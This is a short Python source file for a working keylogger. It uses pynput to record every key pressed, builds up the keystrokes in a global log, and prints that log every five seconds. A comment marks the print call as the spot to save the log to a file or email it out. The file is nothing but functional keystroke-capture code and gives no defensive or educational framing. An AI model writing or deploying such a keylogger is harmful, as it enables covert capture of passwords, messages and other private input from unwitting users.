#! /usr/bin/env python

import pynput.keyboard as pynkey
import threading

log = ""


class Keylogger:
    def process_key_press(self, key):
        global log
        try:
            log += str(key.char)
        except AttributeError:
            if key == key.space:
                log += " "
            else:
                log += " " + str(key) + " "

    def report(self):
        global log
        print(log)  # Place for reporting the log. Either saving to file or sending by email.
        log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynkey.Listener(on_press=self.process_key_press)
        # Can also run it without 'with' block, using .join() method.
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
